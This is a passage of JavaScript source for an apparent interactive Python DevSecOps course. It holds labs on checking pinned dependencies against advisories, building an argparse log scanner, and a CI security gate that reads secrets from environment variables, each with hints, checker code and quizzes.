      '<div class="callout"><b>Files in this lab:</b> <code>requirements.txt</code> and <code>advisories.json</code>. Each advisory says: versions of <code>package</code> <b>below</b> <code>fixed_in</code> are vulnerable.</div>' +
      "<h3>requirements.txt</h3><p>pip's dependency file: one package per line, usually <b>pinned</b> to an exact version with <code>==</code>. Lines can have comments, and package names are case-insensitive (<code>Django</code> = <code>django</code>).</p>" +
      ex('print(open("requirements.txt").read())') +
      "<p>An unpinned line like <code>flask</code> means \"whatever is newest when you install\", so two builds of the same code can get different versions. Scanners flag that too.</p>" +
      "<h3>The version trap</h3><p>Versions look like numbers, but they're strings, and strings compare <b>character by character</b>:</p>" +
      ex('print("4.2.10" < "4.2.9")    # True?!\nprint("10.0" < "9.0")      # True?!') +
      "<p>At the 5th character, <code>\"1\"</code> comes before <code>\"9\"</code>, so string comparison says 4.2.10 is older. Split on dots and turn each part into an int; <b>tuples</b> compare item by item, which is exactly what versions need:</p>" +
      ex('a = tuple(int(x) for x in "4.2.10".split("."))\nb = tuple(int(x) for x in "4.2.9".split("."))\nprint(a, b, a < b)\nprint((42, 0, 0) < (42, 0, 4))') +
      "<p>(Real versions can be messier, like <code>2.0.0rc1</code>; the <code>packaging</code> library handles those. Ours are all plain numbers.)</p>" +
      "<h3>Sorting by severity</h3><p>Severity words don't sort alphabetically in a useful order, so map them to numbers and sort with a key that returns a tuple: first by severity, then by name.</p>" +
      ex('ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}\nitems = [("requests", "medium"), ("django", "high"), ("jinja2", "medium")]\nprint(sorted(items, key=lambda x: (ORDER[x[1]], x[0])))'),
    starter: py`
      # PY-122 · Are we running vulnerable packages?
      import json

      ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


      def parse_requirements(text):
          pass


      def version_tuple(version):
          pass


      def find_vulnerable(pins, advisories):
          pass


      # 4) Load both files, find the vulnerable packages and print the report

    `,
    files: { "requirements.txt": REQUIREMENTS, "advisories.json": JSON.stringify(ADVISORIES, null, 2) + "\n" },
    objectives: [
      {
        id: "parse",
        text: "<code>parse_requirements(text)</code> returns a dict: package name in <b>lowercase</b> → its pinned version string, or <code>None</code> if the line isn't pinned with <code>==</code>. Skip blank lines and comments, and ignore <code># comments</code> after a requirement.",
        hints: ["For each line: cut off comments with line.split(\"#\")[0].strip(), skip it if empty. If \"==\" is in it, name, version = line.split(\"==\"); otherwise the version is None.",
          'def parse_requirements(text):\n    pins = {}\n    for line in text.splitlines():\n        line = line.split("#")[0].strip()\n        if not line:\n            continue\n        if "==" in line:\n            name, version = line.split("==")\n            pins[name.strip().lower()] = version.strip()\n        else:\n            pins[line.lower()] = None\n    return pins'],
        check: py`
          def check(ns, out, run, src):
              f = H.fn(ns, "parse_requirements")
              if not f:
                  return "I can't find a function called parse_requirements."
              text = "# web\nDjango==4.2.10\n\nJinja2==3.1.4   # templates\n  # indented comment\nFlask\nrequests == 2.31.0\n"
              ok, got = H.call(f, text)
              want = {"django": "4.2.10", "jinja2": "3.1.4", "flask": None, "requests": "2.31.0"}
              if not ok:
                  return "parse_requirements crashed: " + type(got).__name__ + ": " + str(got)
              if got != want:
                  return "For this text:\n  " + text.replace("\n", "\n  ") + "\nparse_requirements returned " + H.short(got, 200) + "\nexpected " + H.short(want, 200)
              return True
        `
      },
      {
        id: "version",
        text: "<code>version_tuple(version)</code> turns <code>\"4.2.10\"</code> into <code>(4, 2, 10)</code>, so versions compare correctly.",
        hints: ["Split on \".\" and convert each part with int(). tuple(...) around a generator or list does it in one line.",
          'def version_tuple(version):\n    return tuple(int(part) for part in version.split("."))'],
        check: py`
          def check(ns, out, run, src):
              r = H.func(ns, "version_tuple", [(("4.2.10",), (4, 2, 10)), (("42.0.0",), (42, 0, 0)), (("10",), (10,)), (("2026.11.1",), (2026, 11, 1))])
              if r is not True:
                  return r
              f = ns["version_tuple"]
              if not f("4.2.10") > f("4.2.9"):
                  return "version_tuple(\"4.2.10\") should compare as newer than version_tuple(\"4.2.9\")."
              return True
        `
      },
      {
        id: "vuln",
        text: "<code>find_vulnerable(pins, advisories)</code> returns a list of <code>(package, version, advisory)</code> for every advisory whose package is pinned to a version <b>below</b> <code>fixed_in</code>, in advisory order. Unpinned packages are skipped here.",
        hints: ["Loop over advisories. version = pins.get(adv[\"package\"]). If version is not None and version_tuple(version) < version_tuple(adv[\"fixed_in\"]), append (adv[\"package\"], version, adv).",
          'def find_vulnerable(pins, advisories):\n    found = []\n    for adv in advisories:\n        version = pins.get(adv["package"])\n        if version is not None and version_tuple(version) < version_tuple(adv["fixed_in"]):\n            found.append((adv["package"], version, adv))\n    return found'],
        check: py`
          def check(ns, out, run, src):
              import json
              f = H.fn(ns, "find_vulnerable")
              if not f:
                  return "I can't find a function called find_vulnerable."
              advs = json.load(open("advisories.json"))
              pins = {"django": "4.2.10", "requests": "2.31.0", "pyyaml": "6.0.1", "jinja2": "3.1.4", "urllib3": "2.2.2", "cryptography": "42.0.0", "flask": None}
              ok, got = H.call(f, pins, advs)
              if not ok:
                  return "find_vulnerable crashed: " + type(got).__name__ + ": " + str(got)
              try:
                  ids = [(p, a["id"]) for p, v, a in got]
              except Exception:
                  return "find_vulnerable should return (package, version, advisory) tuples, got " + H.short(got, 160)
              want = [("django", "KSA-2026-0031"), ("requests", "KSA-2026-0044"), ("jinja2", "KSA-2026-0058"), ("cryptography", "KSA-2026-0107")]
              if ("django", "KSA-2026-0113") in ids:
                  return "django 4.2.10 was flagged for an advisory fixed in 4.2.9. As strings, \"4.2.10\" < \"4.2.9\": compare version_tuple()s instead."
              if ("urllib3", "KSA-2026-0072") in ids:
                  return "urllib3 2.2.2 is exactly the fixed version, so it isn't vulnerable. Use < (below fixed_in), not <=."
              if ids != want:
                  return "find_vulnerable found " + H.short(ids, 200) + "\nexpected " + H.short(want, 200)
              ok, got = H.call(f, {"django": "4.2.16", "jinja2": "3.0.9"}, advs)
              if not ok or [(p, a["id"]) for p, v, a in got] != [("jinja2", "KSA-2026-0058")]:
                  return "With django 4.2.16 and jinja2 3.0.9, only jinja2 should be vulnerable, got " + H.short(got if not ok else [(p, a["id"]) for p, v, a in got], 160) + "."
              return True
        `
      },
      {
        id: "report",
        text: "Print the vulnerable packages sorted by severity (critical first) then name, as <code>f\"{severity.upper():8} {package} {version} -> {fixed_in} ({id})\"</code>, then <code>UNPINNED flask</code> for each unpinned package.",
        hints: ["Load the two files, call find_vulnerable, then sorted(found, key=lambda f: (ORDER[f[2][\"severity\"]], f[0])). Unpinned ones are the names whose version is None.",
          'with open("requirements.txt") as f:\n    pins = parse_requirements(f.read())\nwith open("advisories.json") as f:\n    advisories = json.load(f)\n\nfound = find_vulnerable(pins, advisories)\nfor package, version, adv in sorted(found, key=lambda x: (ORDER[x[2]["severity"]], x[0])):\n    print(f"{adv[\'severity\'].upper():8} {package} {version} -> {adv[\'fixed_in\']} ({adv[\'id\']})")\nfor name, version in pins.items():\n    if version is None:\n        print(f"UNPINNED {name}")'],
        check: WITH_CHANGED + py`
          def check(ns, out, run, src):
              want = ["CRITICAL cryptography 42.0.0 -> 42.0.4 (KSA-2026-0107)",
                      "HIGH     django 4.2.10 -> 4.2.16 (KSA-2026-0031)",
                      "MEDIUM   jinja2 3.1.4 -> 3.1.5 (KSA-2026-0058)",
                      "MEDIUM   requests 2.31.0 -> 2.32.0 (KSA-2026-0044)",
                      "UNPINNED flask"]
              r = H.printed(out, want)
              if r is not True:
                  return r
              text = open("requirements.txt").read().replace("cryptography==42.0.0", "cryptography==42.0.4").replace("flask", "flask==3.0.3")
              n, o, e = with_changed(run, "requirements.txt", text)
              got = H.lines(o)
              if any("cryptography" in l for l in got) or any("flask" in l for l in got):
                  return "After upgrading cryptography to 42.0.4 and pinning flask, they still appear in your report. Build it from the files."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. One upgrade is critical and one high; both get a pull request today. And <code>flask</code> gets pinned, so next week's build can't silently pull in a different version.</p>" +
      "<p><b>Why this matters:</b> \"Vulnerable and Outdated Components\" is in the OWASP Top 10. Most of the code in any modern app is dependencies, so checking them is one of the highest-value things a DevSecOps engineer automates.</p>",
    realworld: "pip-audit does exactly this against the real advisory databases (PyPI / OSV), npm audit does it for JavaScript, and Dependabot or Renovate open the upgrade pull requests for you. A real requirements.txt can also hold version ranges (>=, ~=), which is why real tools use the packaging library.",
    quiz: [
      { q: "What does <code>\"4.2.10\" &lt; \"4.2.9\"</code> give in Python?", options: ["False", "True", "An error", "None"], answer: 1,
        why: "Strings compare character by character, and \"1\" < \"9\". That's why we convert to tuples of ints." },
      { q: "An advisory says <code>fixed_in: 2.2.2</code>. Is version 2.2.2 vulnerable?", options: ["Yes", "No, it's the version with the fix", "Only on Windows", "It depends on severity"], answer: 1,
        why: "Versions strictly below fixed_in are vulnerable. The fixed version and newer are not." },
      { q: "Why flag an unpinned dependency like <code>flask</code>?", options: ["It's always vulnerable", "Different builds can install different versions, so what you scanned isn't what you ship", "pip can't install it", "It's slower"], answer: 1,
        why: "Pinning makes builds reproducible, so your scan results apply to what actually runs." }
    ]
  });

  /* ================================================================== PY-123 */
  var APP_LOGS = {
    "logs/app.log": lines(
      "2026-11-10 08:00:01 INFO server started on :8080",
      "2026-11-10 08:00:07 WARNING slow response from db-01 (1200 ms)",
      "2026-11-10 08:01:13 ERROR db timeout",
      "2026-11-10 08:01:44 ERROR db timeout",
      "2026-11-10 08:02:05 INFO health check ok",
      "2026-11-10 08:02:31 ERROR cache unreachable",
      "2026-11-10 08:03:02 WARNING slow response from db-01 (980 ms)",
      "2026-11-10 08:03:40 ERROR db timeout",
      "2026-11-10 08:04:10 ERROR payment provider returned 502",
      "2026-11-10 08:04:55 WARNING disk 85% full"),
    "logs/api.log": lines(
      "2026-11-10 09:00:00 INFO api up",
      "2026-11-10 09:00:10 ERROR token expired",
      "2026-11-10 09:00:20 ERROR token expired",
      "2026-11-10 09:00:30 WARNING rate limit at 80%")
  };

  // PY-123 checks: build a parser and try argument lists on it, catching argparse's SystemExit.
  var PARSE = py`
    import io as _io, contextlib as _cl

    def parse(ns, args):
        """(namespace, None) on success, (None, exit code) when argparse rejects the arguments."""
        p = ns["build_parser"]()
        buf = _io.StringIO()
        try:
            with _cl.redirect_stdout(buf), _cl.redirect_stderr(buf):
                return p.parse_args(args), None
        except SystemExit as e:
            return None, e.code
  ` + "\n\n";

  LABS.push({
    id: "py-123", n: 23, module: 3, ticket: "PY-123", xp: 100,
    title: "Make it a real tool",
    topic: "Command-line tools with argparse",
    from: "Maya Chen · SRE lead",
    story: "<p>Every script we've written so far has its settings typed into the code. To check a different log you edit the file, and that's not something you can put in a cron job or a pipeline.</p>" +
      "<p>Real tools take <b>arguments</b>: <code>python logscan.py logs/api.log --level WARNING --top 5</code>. Build our log scanner that way, with a proper <code>--help</code>.</p>",
    learn:
      '<div class="callout"><b>New: the Arguments box</b> under the editor. Whatever you type there goes after <code>python main.py</code>, as if you typed it in a terminal. Press Enter in the box to run. The console also shows the program\'s <b>exit code</b>.</div>' +
      "<h3>sys.argv</h3><p>Python puts the command-line words in <code>sys.argv</code>: the script name first, then each argument as a string. Try changing the Arguments box and pressing Run with this code:</p>" +
      ex('import sys\nprint(sys.argv)') +
      "<p>You could pick <code>sys.argv[1]</code> apart yourself, but then you'd also have to write the help text, the error messages, type conversion and defaults. <code>argparse</code> does all of that.</p>" +
      "<h3>argparse: describe the arguments, it does the rest</h3>" +
      ex('import argparse\n\nparser = argparse.ArgumentParser(prog="logscan", description="Count log messages by level.")\nparser.add_argument("path", help="log file to scan")\nparser.add_argument("--level", choices=["INFO", "WARNING", "ERROR"], default="ERROR", help="level to count")\nparser.add_argument("--top", type=int, default=3, help="how many messages to show")\nparser.add_argument("--json", action="store_true", help="print JSON instead of text")\n\nargs = parser.parse_args(["logs/app.log", "--top", "5"])\nprint(args)\nprint(args.path, args.level, args.top, args.json)') +
      '<table class="t"><tr><th>Kind</th><th>Example</th><th>Notes</th></tr>' +
      "<tr><td>positional</td><td><code>add_argument(\"path\")</code></td><td>required, by position</td></tr>" +
      "<tr><td>option</td><td><code>add_argument(\"--top\", type=int, default=3)</code></td><td>optional; <code>type</code> converts and validates</td></tr>" +
      "<tr><td>choices</td><td><code>choices=[\"INFO\", ...]</code></td><td>anything else is rejected</td></tr>" +
      "<tr><td>flag</td><td><code>action=\"store_true\"</code></td><td><code>False</code> unless given</td></tr></table>" +
      "<p>The value lands on <code>args</code> under the option's name without the dashes: <code>--top</code> → <code>args.top</code>.</p>" +
      "<h3>Free help and errors</h3><p>Bad input never reaches your code: argparse prints a usage message and exits with code <b>2</b>, the convention for \"you used the command wrong\".</p>" +
      ex('import argparse\n\nparser = argparse.ArgumentParser(prog="logscan")\nparser.add_argument("path")\nparser.add_argument("--top", type=int, default=3)\nparser.parse_args(["--help"])') +
      ex('import argparse\n\nparser = argparse.ArgumentParser(prog="logscan")\nparser.add_argument("path")\nparser.add_argument("--top", type=int, default=3)\nparser.parse_args(["logs/app.log", "--top", "lots"])') +
      "<p>For your own checks, <code>parser.error(\"message\")</code> prints the same kind of error and exits with 2.</p>" +
      "<h3>The main() pattern</h3><p><code>parse_args()</code> with no list reads <code>sys.argv</code>. Put the tool's work in a <code>main()</code> function and call it under <code>if __name__ == \"__main__\":</code>, so other code (and tests) can import your functions without running the tool.</p>" +
      '<pre class="code">def main():\n    args = build_parser().parse_args()\n    ...\n\nif __name__ == "__main__":\n    main()</pre>' +
      "<p>Each log line is <code>date time LEVEL message</code>. <code>line.split(\" \", 3)</code> splits at the first 3 spaces only, so the message stays in one piece.</p>",
    starter: py`
      # PY-123 · Make it a real tool
      import argparse
      import json
      from collections import Counter
      from pathlib import Path


      def build_parser():
          parser = argparse.ArgumentParser(prog="logscan", description="Count log messages by level.")
          # 1-3) add the arguments here. Until path exists, argparse rejects the
          #      logs/app.log in the Arguments box ("unrecognized arguments").
          return parser


      def main():
          args = build_parser().parse_args()
          print(args)
          # 4-5) scan args.path and print the report


      if __name__ == "__main__":
          main()
    `,
    argv: "logs/app.log",
    files: APP_LOGS,
    objectives: [
      {
        id: "path",
        text: "<code>build_parser()</code> has a required positional argument <code>path</code>.",
        hints: ["parser.add_argument(\"path\", help=\"log file to scan\")"],
        check: PARSE + py`
          def check(ns, out, run, src):
              if not H.fn(ns, "build_parser"):
                  return "I can't find a function called build_parser."
              try:
                  a, code = parse(ns, ["logs/x.log"])
              except Exception as e:
                  return "build_parser() crashed: " + type(e).__name__ + ": " + str(e)
              if a is None:
                  return "parse_args([\"logs/x.log\"]) was rejected. Add a positional argument: parser.add_argument(\"path\")."
              if getattr(a, "path", None) != "logs/x.log":
                  return "After parse_args([\"logs/x.log\"]), args.path should be \"logs/x.log\"."
              a, code = parse(ns, [])
              if a is not None:
                  return "With no arguments at all, argparse should refuse (path is required). Make path positional, not --path."
              return True
        `
      },
      {
        id: "options",
        text: "Add <code>--level</code> (choices <code>INFO</code>, <code>WARNING</code>, <code>ERROR</code>; default <code>ERROR</code>) and <code>--top</code> (an <code>int</code>, default <code>3</code>).",
        hints: ["choices=[...] and default=\"ERROR\" for --level; type=int and default=3 for --top.",
          'parser.add_argument("--level", choices=["INFO", "WARNING", "ERROR"], default="ERROR", help="level to count")\nparser.add_argument("--top", type=int, default=3, help="how many messages to show")'],
        check: PARSE + py`
          def check(ns, out, run, src):
              if not H.fn(ns, "build_parser"):
                  return "I can't find a function called build_parser."
              a, code = parse(ns, ["x.log"])
              if a is None:
                  return "parse_args([\"x.log\"]) was rejected. Make sure the new options aren't required."
              if getattr(a, "level", None) != "ERROR" or getattr(a, "top", None) != 3:
                  return "With no options, args.level should be \"ERROR\" and args.top should be 3. Got level=" + H.short(getattr(a, "level", "(missing)")) + ", top=" + H.short(getattr(a, "top", "(missing)")) + "."
              a, code = parse(ns, ["x.log", "--level", "WARNING", "--top", "2"])
              if a is None or a.level != "WARNING" or a.top != 2:
                  if a is not None and a.top == "2":
                      return "args.top came out as the string \"2\". Add type=int."
                  return "\"x.log --level WARNING --top 2\" should give level WARNING and top 2."
              a, code = parse(ns, ["x.log", "--level", "DEBUG"])
              if a is not None:
                  return "--level DEBUG was accepted. Use choices=[\"INFO\", \"WARNING\", \"ERROR\"] so argparse rejects anything else."
              a, code = parse(ns, ["x.log", "--top", "lots"])
              if a is not None:
                  return "--top lots was accepted. type=int makes argparse reject values that aren't numbers."
              return True
        `
      },
      {
        id: "flag",
        text: "Add a <code>--json</code> flag: <code>False</code> by default, <code>True</code> when given (no value after it).",
        hints: ["action=\"store_true\" makes an option a yes/no flag.", 'parser.add_argument("--json", action="store_true", help="print JSON instead of text")'],
        check: PARSE + py`
          def check(ns, out, run, src):
              if not H.fn(ns, "build_parser"):
                  return "I can't find a function called build_parser."
              a, code = parse(ns, ["x.log"])
              if a is None or getattr(a, "json", None) is not False:
                  return "Without --json, args.json should be False. Use action=\"store_true\"."
              a, code = parse(ns, ["x.log", "--json"])
              if a is None:
                  return "\"x.log --json\" was rejected: argparse expected a value after --json. Use action=\"store_true\"."
              if a.json is not True:
                  return "With --json, args.json should be True."
              return True
        `
      },
      {
        id: "text",
        text: "<code>main()</code> counts the messages at <code>args.level</code> in <code>args.path</code> and prints <code>ERROR in logs/app.log: 5 lines</code> then the top <code>args.top</code> messages as <code>f\"  {count}  {message}\"</code>. If the file doesn't exist, call <code>parser.error(...)</code> (exit code 2).",
        hints: ["Keep the parser in a variable so you can call parser.error. For each line: date, time, level, message = line.rstrip(\"\\n\").split(\" \", 3). Count messages whose level matches in a Counter, then use .most_common(args.top).",
          'def main():\n    parser = build_parser()\n    args = parser.parse_args()\n    if not Path(args.path).exists():\n        parser.error(f"{args.path} doesn\'t exist")\n    counts = Counter()\n    with open(args.path) as f:\n        for line in f:\n            date, time, level, message = line.rstrip("\\n").split(" ", 3)\n            if level == args.level:\n                counts[message] += 1\n    top = counts.most_common(args.top)\n    total = sum(counts.values())\n    if args.json:\n        print(json.dumps({"path": args.path, "level": args.level, "total": total, "top": top}))\n    else:\n        print(f"{args.level} in {args.path}: {total} lines")\n        for message, count in top:\n            print(f"  {count}  {message}")'],
        check: py`
          def check(ns, out, run, src):
              def go(argv):
                  n, o, e = run(argv=argv)
                  return H.lines(o), n.get("__exit_code__"), e
              got, code, e = go("logs/app.log")
              want = ["ERROR in logs/app.log: 5 lines", "  3  db timeout", "  1  cache unreachable", "  1  payment provider returned 502"]
              if e:
                  return "With arguments logs/app.log your code crashed: " + e[0].splitlines()[-1]
              if got != want:
                  return "With arguments: logs/app.log\nExpected:\n  " + "\n  ".join(want) + "\nYou printed:\n  " + "\n  ".join(got[:8] or ["(nothing)"])
              got, code, e = go("logs/api.log --level WARNING --top 1")
              if got != ["WARNING in logs/api.log: 1 lines", "  1  rate limit at 80%"]:
                  return "With arguments: logs/api.log --level WARNING --top 1\nexpected:\n  WARNING in logs/api.log: 1 lines\n    1  rate limit at 80%\nYou printed:\n  " + "\n  ".join(got[:6] or ["(nothing)"]) + "\nUse args.path, args.level and args.top instead of fixed values."
              got, code, e = go("logs/missing.log")
              if e and "FileNotFoundError" in e[1]:
                  return "For a file that doesn't exist your tool crashed with FileNotFoundError. Check Path(args.path).exists() first and call parser.error(...)."
              if code != 2:
                  return "For a missing file the exit code should be 2 (parser.error), but it was " + str(code) + "."
              return True
        `
      },
      {
        id: "json",
        text: "With <code>--json</code>, print one line of JSON instead: <code>{\"path\": ..., \"level\": ..., \"total\": 5, \"top\": [[\"db timeout\", 3], ...]}</code>.",
        hints: ["most_common() gives a list of (message, count) tuples; json.dumps turns tuples into lists. Print json.dumps({...}) and nothing else when args.json is True.",
          'if args.json:\n    print(json.dumps({"path": args.path, "level": args.level, "total": total, "top": counts.most_common(args.top)}))'],
        check: py`
          def check(ns, out, run, src):
              import json
              n, o, e = run(argv="logs/app.log --level WARNING --json")
              if e:
                  return "With --json your code crashed: " + e[0].splitlines()[-1]
              text = o.strip()
              try:
                  data = json.loads(text)
              except ValueError:
                  return "With arguments logs/app.log --level WARNING --json the output should be only JSON, but it was:\n  " + text[:300]
              want = {"path": "logs/app.log", "level": "WARNING", "total": 3,
                      "top": [["slow response from db-01 (1200 ms)", 1], ["slow response from db-01 (980 ms)", 1], ["disk 85% full", 1]]}
              if data != want:
                  return "The JSON should be:\n  " + json.dumps(want) + "\nYours:\n  " + json.dumps(data)
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. <code>logscan</code> now works on any log with any settings, explains itself with <code>--help</code>, and refuses bad input with exit code 2 before doing anything. That's the difference between a script and a tool.</p>" +
      "<p>The <code>--json</code> flag matters more than it looks: humans read text, but <b>other programs</b> (dashboards, CI steps, the next script) read JSON. Most security tools offer both.</p>",
    realworld: "Every tool you'll use in DevSecOps works this way: bandit -r src -f json, trivy image --severity HIGH,CRITICAL, gitleaks detect --report-format json. Reading their --help is a daily skill. For bigger tools, libraries like click and typer build on the same ideas.",
    quiz: [
      { q: "<code>add_argument(\"--top\", type=int)</code>, and the user types <code>--top 5</code>. What is <code>args.top</code>?", options: ["\"5\"", "5", "[5]", "True"], answer: 1,
        why: "type=int converts it, and rejects values that aren't numbers." },
      { q: "What exit code does argparse use for bad arguments?", options: ["0", "1", "2", "-1"], answer: 2,
        why: "2 is the Unix convention for \"wrong usage\". 0 means success and 1 usually means the tool ran and found a problem." },
      { q: "Why put the tool's work in <code>main()</code> under <code>if __name__ == \"__main__\":</code>?", options: ["It runs faster", "Importing the file (e.g. from tests) doesn't run the tool", "argparse requires it", "It hides the code"], answer: 1,
        why: "__name__ is \"__main__\" only when the file is run directly, not when it's imported." }
    ]
  });

  /* ================================================================== PY-124 */
  var SCAN_RESULTS = [
    { id: "KSV-2041", severity: "high", title: "jinja2 sandbox escape (KSA-2026-0058)" },
    { id: "KSV-1187", severity: "critical", title: "Private key committed in deploy/" },
    { id: "KSV-0904", severity: "medium", title: "Container runs as root" },
    { id: "KSV-0311", severity: "low", title: "Missing HSTS header" },
    { id: "KSV-0722", severity: "high", title: "Storage bucket allows public read" }
  ];

  LABS.push({
    id: "py-124", n: 24, module: 3, ticket: "PY-124", xp: 100,
    title: "Fail the build",
    topic: "Environment variables, secrets & exit codes",
    from: "Dev Patel · Security",
    story: "<p>Our scanners produce reports that nobody reads. The fix: a <b>security gate</b> in the pipeline that <b>fails the build</b> when there are findings at or above a threshold, so a merge can't go ahead until someone deals with them.</p>" +
      "<p>The gate needs our API token, which must <b>never</b> be in the code, and its threshold must be configurable per repo. Both come from environment variables.</p>",
    learn:
      '<div class="callout"><b>New: the Environment box</b> under the editor holds the environment variables your program starts with, one <code>NAME=value</code> per line. Edit it and press Run to see what changes. The file <code>scan-results.json</code> holds the findings to gate on.</div>' +
      "<h3>Environment variables</h3><p>Every program starts with a set of named text values from whatever launched it: your terminal, cron, or the CI runner. <code>os.environ</code> works like a dict of them.</p>" +
      ex('import os\n\nprint(os.environ.get("FAIL_ON"))\nprint(os.environ.get("NOT_SET"))\nprint(os.environ.get("NOT_SET", "default value"))') +
      "<p><code>os.environ[\"NAME\"]</code> raises <code>KeyError</code> if it's missing, so prefer <code>.get()</code> and decide yourself what a missing value means. Values are always <b>strings</b>.</p>" +
      '<table class="t"><tr><th>Where</th><th>How you set one</th></tr>' +
      "<tr><td>Linux / macOS shell</td><td><code>export FAIL_ON=critical</code></td></tr>" +
      "<tr><td>PowerShell</td><td><code>$env:FAIL_ON = \"critical\"</code></td></tr>" +
      "<tr><td>GitHub Actions</td><td><code>env:</code> in the workflow, secrets as <code>${{ secrets.NAME }}</code></td></tr></table>" +
      '<pre class="code">- name: Security gate\n  run: python gate.py\n  env:\n    KESTREL_API_TOKEN: ${{ secrets.KESTREL_API_TOKEN }}\n    FAIL_ON: high</pre>' +
      "<h3>Why secrets go in the environment</h3><ul><li>They stay out of the code, so out of Git history (PY-121).</li><li>Each environment (laptop, staging, production) can use a different value with the same code.</li><li>CI systems store them encrypted and replace them with <code>***</code> in logs.</li></ul>" +
      "<p>That last protection only works for exact values, so <b>never print a secret</b>, not even part of it, and never dump all of <code>os.environ</code> into a log.</p>" +
      "<h3>Exit codes</h3><p>When a program ends it returns a number to whatever started it: <b>0 means success</b>, anything else means failure. CI runs each step and <b>fails the job if the exit code isn't 0</b>. That's the whole mechanism behind a gate.</p>" +
      ex('import sys\n\nprint("checking...")\nsys.exit(1)') +
      "<p>Run that code in the editor to see <code>exit code 1 (failure)</code> in the console. Error messages go to <b>stderr</b>, the error output stream: <code>print(\"error: ...\", file=sys.stderr)</code>. Common codes: 0 OK, 1 checks failed, 2 used wrongly (bad configuration or arguments).</p>" +
      "<h3>Talking to GitHub Actions</h3><p>When a step runs in GitHub Actions, the environment has <code>GITHUB_ACTIONS=true</code>, and lines printed in a special format become annotations in the pull request:</p>" +
      '<pre class="code">::error title=KSV-1187::Private key committed in deploy/</pre>',
    starter: py`
      # PY-124 · Fail the build
      import json
      import os
      import sys

      LEVELS = ["low", "medium", "high", "critical"]

      # 1) token from KESTREL_API_TOKEN: missing -> error on stderr, exit code 2


      # 2) fail_on from FAIL_ON (default "high"), lowercased; unknown level -> exit code 2


      with open("scan-results.json") as f:
          findings = json.load(f)

      # 3) blocking: findings at or above fail_on, in file order


      # 4) Print the result and exit with 1 (blocked) or 0 (passed)

    `,
    env: { KESTREL_API_TOKEN: "kc_demo_7f3a", FAIL_ON: "high" },
    files: { "scan-results.json": JSON.stringify(SCAN_RESULTS, null, 2) + "\n" },
    objectives: [
      {
        id: "token",
        text: "Read the token from <code>KESTREL_API_TOKEN</code>. If it's missing or empty, print <code>error: KESTREL_API_TOKEN is not set</code> to <b>stderr</b> and exit with code <b>2</b>. Never print the token.",
        hints: ["token = os.environ.get(\"KESTREL_API_TOKEN\"). if not token: print(..., file=sys.stderr) then sys.exit(2).",
          'token = os.environ.get("KESTREL_API_TOKEN")\nif not token:\n    print("error: KESTREL_API_TOKEN is not set", file=sys.stderr)\n    sys.exit(2)'],
        check: py`
          def check(ns, out, run, src):
              n, o, e = run(env={"FAIL_ON": "high"})
              if e and "KeyError" in e[1]:
                  return "Without KESTREL_API_TOKEN your code crashed with KeyError. Use os.environ.get(...) and handle the missing value."
              if n.get("__exit_code__") != 2:
                  return "Without KESTREL_API_TOKEN the exit code should be 2, but it was " + str(n.get("__exit_code__")) + ". Use sys.exit(2)."
              if "error: KESTREL_API_TOKEN is not set" not in o:
                  return "Without the token, print error: KESTREL_API_TOKEN is not set (to stderr) before exiting."
              n, o, e = run(env={"KESTREL_API_TOKEN": "", "FAIL_ON": "high"})
              if n.get("__exit_code__") != 2:
                  return "An empty KESTREL_API_TOKEN should also exit with code 2. Test with if not token:."
              for tok in ["kc_demo_7f3a", "kc_live_93fd02ab"]:
                  n, o, e = run(env={"KESTREL_API_TOKEN": tok, "FAIL_ON": "high"})
                  if tok in o or tok[:8] in o:
                      return "Your output contains the token (" + tok[:5] + "...). Never print secrets: CI logs are read by many people."
              if "token" not in ns:
                  return "Store the value in a variable called token."
              return True
        `
      },
      {
        id: "level",
        text: "Set <code>fail_on</code> from <code>FAIL_ON</code>, default <code>\"high\"</code>, in lowercase. If it isn't one of <code>LEVELS</code>, print <code>error: FAIL_ON must be one of low, medium, high, critical</code> to stderr and exit with 2.",
        hints: ['fail_on = os.environ.get("FAIL_ON", "high").lower(), then if fail_on not in LEVELS: print the error and sys.exit(2). ", ".join(LEVELS) builds the list.',
          'fail_on = os.environ.get("FAIL_ON", "high").lower()\nif fail_on not in LEVELS:\n    print("error: FAIL_ON must be one of " + ", ".join(LEVELS), file=sys.stderr)\n    sys.exit(2)'],
        check: py`
          def check(ns, out, run, src):
              tok = {"KESTREL_API_TOKEN": "kc_demo_7f3a"}
              for env, want in [({"FAIL_ON": "high"}, "high"), ({"FAIL_ON": "CRITICAL"}, "critical"), ({}, "high"), ({"FAIL_ON": "Low"}, "low")]:
                  e2 = dict(tok)
                  e2.update(env)
                  n, o, e = run(env=e2)
                  if n.get("fail_on") != want:
                      label = "FAIL_ON=" + env["FAIL_ON"] if env else "FAIL_ON not set"
                      return "With " + label + ", fail_on should be " + repr(want) + " but it's " + H.short(n.get("fail_on", "(missing)")) + "."
              n, o, e = run(env={"KESTREL_API_TOKEN": "kc_demo_7f3a", "FAIL_ON": "urgent"})
              if n.get("__exit_code__") != 2 or "FAIL_ON must be one of" not in o:
                  return "With FAIL_ON=urgent, print error: FAIL_ON must be one of low, medium, high, critical and exit with code 2 (got exit code " + str(n.get("__exit_code__")) + ")."
              return True
        `
      },
      {
        id: "blocking",
        text: "<code>blocking</code> is the list of findings (dicts, in file order) whose severity is at or above <code>fail_on</code>.",
        hints: ["Compare positions in LEVELS: LEVELS.index(f[\"severity\"]) >= LEVELS.index(fail_on).",
          'threshold = LEVELS.index(fail_on)\nblocking = [f for f in findings if LEVELS.index(f["severity"]) >= threshold]'],
        check: py`
          def check(ns, out, run, src):
              for level, want in [("high", ["KSV-2041", "KSV-1187", "KSV-0722"]), ("critical", ["KSV-1187"]), ("low", ["KSV-2041", "KSV-1187", "KSV-0904", "KSV-0311", "KSV-0722"])]:
                  n, o, e = run(env={"KESTREL_API_TOKEN": "kc_demo_7f3a", "FAIL_ON": level})
                  b = n.get("blocking")
                  if not isinstance(b, list):
                      return "I can't find a list called blocking (with FAIL_ON=" + level + ")."
                  ids = [f.get("id") if isinstance(f, dict) else f for f in b]
                  if ids != want:
                      return "With FAIL_ON=" + level + ", blocking should hold " + H.short(want, 120) + " but has " + H.short(ids, 120) + ". Compare positions in LEVELS, not the words themselves."
              return True
        `
      },
      {
        id: "gate",
